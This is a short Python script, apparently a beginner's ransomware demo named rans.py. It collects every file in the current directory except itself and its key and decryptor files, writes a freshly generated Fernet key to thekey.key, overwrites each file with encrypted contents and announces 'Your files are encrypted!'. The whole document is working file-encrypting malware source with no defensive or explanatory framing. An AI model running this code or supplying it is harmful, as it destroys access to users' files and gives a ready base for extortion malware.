import os
from cryptography.fernet import Fernet

files = []
key = Fernet.generate_key()

for file in os.listdir():
    if file == "rans.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(files)
# print(key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)
thekey.close()

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)
        
print('Your files are encrypted!')